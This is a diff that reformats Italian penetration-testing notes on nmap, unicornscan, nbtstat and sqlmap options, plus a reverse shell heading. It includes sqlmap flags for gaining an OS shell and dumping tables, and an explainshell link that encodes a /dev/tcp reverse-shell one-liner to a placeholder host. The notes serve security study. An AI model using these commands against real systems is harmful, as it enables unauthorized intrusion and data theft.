@@ -288,12 +288,12 @@ Tool di scansione della rete molto efficace e con numerosissime opzioni e modali
 >> --datalenght *n*: padding aggiuntivo ai pacchetti per raggiungere una dimensione prestabilita  
 >
 > altri comandi
->> -O: rileva il sistema operativo in uso
->> -A: equivale a -O -sV -sC
->> --script _script_: esegue uno script specifico
->> --reason: shows a new column with REASON
->> -v: verbose, quindi aumenta i commenti e le info stampate
->> -send-IP <ip-range>: seleziona il range di ip da scansionare
+>> -O: rileva il sistema operativo in uso  
+>> -A: equivale a -O -sV -sC  
+>> --script _script_: esegue uno script specifico  
+>> --reason: shows a new column with REASON  
+>> -v: verbose, quindi aumenta i commenti e le info stampate  
+>> -send-IP <ip-range>: seleziona il range di ip da scansionare  
 >
 > Scan con ping arp per vedere se degli host sono vivi:
 >> nmap -sn -PR -send-IP <IP-RANGE>
@@ -322,8 +322,8 @@ Command line network information gathering and reconnaissance tool. Asynchronous
 > unicornscan ***[ipaddress]***
 >
 > alcune opzioni sono:
->> -I: immediate mode
->> -v: verbose mode  
+>> -I: immediate mode  
+>> -v: verbose mode    
 
 tips and tricks:
 - se il ***TTL è 128***, probabilmente la macchina è un Windows Server
@@ -404,12 +404,12 @@ Tool per effettuare enumerazione di rete.
 
 > nbtstat  
 >
->> -a [remote name]: mostra la NetBIOS name table del computer remoto  
->> -A [IP Address]: mostra la name table del computer remoto
->> -c: mostra i contenuti del NetBios name cache
->> -n: mostra i nomi registrati localmente da NetBIOS
->> -r: mostra il conteggio di tutti i nomi risolti tramite broadcast
->> -s: lista le tabelle di sessione NetBIOS convertendo IP di destinazione con i NetBios names.  
+>> -a [remote name]: mostra la NetBIOS name table del computer remoto   
+>> -A [IP Address]: mostra la name table del computer remoto  
+>> -c: mostra i contenuti del NetBios name cache  
+>> -n: mostra i nomi registrati localmente da NetBIOS  
+>> -r: mostra il conteggio di tutti i nomi risolti tramite broadcast  
+>> -s: lista le tabelle di sessione NetBIOS convertendo IP di destinazione con i NetBios names.    
 
 Comando per mostrare le informazioni sul target come stato di connessione, shared drive e informazioni di rete.
 > net use
@@ -434,14 +434,14 @@ il comando da lanciare è:
 > sqlmap
 
 alcune opzioni utili sono:
-> --os-shell: prova ad ottenere l'accesso ad una shell remota, exploitando anche la vulnerabilità
-> --cookie="COOKIE=VALORE": per impostare cookie come PHPSESSION
-> --auth-type="...": con valori predefiniti, serve per impostare il tipo di auth da http header
-> --dbs: enumerates DBMS Databases
-> -D [database]: scegli un database da testare
-> --tables: enumerates DBMS database tables
-> -T [tabella]: scegli una tabella da enumerare
-> --dump: dump all content of a table
+> --os-shell: prova ad ottenere l'accesso ad una shell remota, exploitando anche la vulnerabilità  
+> --cookie="COOKIE=VALORE": per impostare cookie come PHPSESSION  
+> --auth-type="...": con valori predefiniti, serve per impostare il tipo di auth da http header  
+> --dbs: enumerates DBMS Databases    
+> -D [database]: scegli un database da testare  
+> --tables: enumerates DBMS database tables  
+> -T [tabella]: scegli una tabella da enumerare  
+> --dump: dump all content of a table  
 
 ## Wappalyzer
 Estenzione web che mostra tutte le componenti di una pagina e tutti i linguaggi di cui è composta
@@ -737,9 +737,8 @@ tool per accedere ad una AD da linux -> presente in kali
 
 # REVERSE SHELL
 
-Sito che spiega come funzionano
-> https://explainshell.com/explain?cmd=sh+-i+%3E%26+%2Fdev%2Ftcp%2F1.2.3.4%2F4444+0%3C%261#
-> 
+Sito che spiega come funzionano: [Explain Shell](https://explainshell.com/explain?cmd=sh+-i+%3E%26+%2Fdev%2Ftcp%2F1.2.3.4%2F4444+0%3C%261#)
+
 
 ## bersaglio Linux
 
